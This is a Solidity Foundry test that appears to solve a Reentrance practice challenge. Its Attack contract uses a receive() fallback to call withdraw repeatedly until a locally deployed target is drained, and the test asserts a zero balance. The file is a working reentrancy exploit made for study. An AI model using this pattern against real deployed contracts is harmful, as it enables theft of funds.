pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Reentrance.sol";

contract Attack {
    address payable private target;

    constructor(address payable _target) payable {
        target = _target;
    }

    function call(bytes memory data, uint256 value)
        public
        payable
        returns (bytes memory)
    {
        (bool success, bytes memory retVal) = target.call{value: value}(data);
        require(success, "Attack::call: failed");
        return retVal;
    }

    function encodeWithdraw() public pure returns (bytes memory) {
        return abi.encodeCall(Reentrance.withdraw, (0.1 ether));
    }

    receive() external payable {
        if (target.balance >= 0.1 ether) call(encodeWithdraw(), 0);
    }
}

contract ASMReentrance is Test {
    address public attacker = address(420);
    Reentrance public target;
    Attack attackContract;

    function setUp() public {
        target = new Reentrance();
        vm.deal(address(target), 1 ether);
        vm.deal(attacker, 1 ether);
        attackContract = new Attack{value: 0.1 ether}(payable(address(target)));
    }

    modifier attack() {
        vm.startPrank(attacker);
        _;
        vm.stopPrank();
    }

    function testASMReentrance() public attack {
        bytes memory donateCall = abi.encodeCall(
            target.donate,
            (address(attackContract))
        );
        attackContract.call(donateCall, 0.1 ether);
        attackContract.call(attackContract.encodeWithdraw(), 0);

        assertEq(address(target).balance, 0);
    }
}
